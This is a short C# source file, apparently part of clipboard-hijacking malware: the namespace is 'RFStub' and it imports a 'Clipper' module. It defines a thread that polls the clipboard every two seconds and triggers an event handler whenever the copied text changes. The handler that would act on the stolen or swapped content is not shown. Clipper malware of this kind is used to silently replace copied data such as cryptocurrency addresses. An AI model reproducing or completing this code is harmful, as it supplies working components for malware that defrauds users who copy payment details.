using System.Threading;
using Clipper;

namespace RFStub;

internal sealed class ClipboardManager
{
	public static string PrevClipboard = "";

	public static string ClipboardText;

	public static Thread MainThread = new Thread(Run);

	private static void Run()
	{
		while (true)
		{
			Thread.Sleep(2000);
			ClipboardText = Clipboard.GetText();
			if (ClipboardText != PrevClipboard)
			{
				PrevClipboard = ClipboardText;
				EventManager.Action();
			}
		}
	}
}
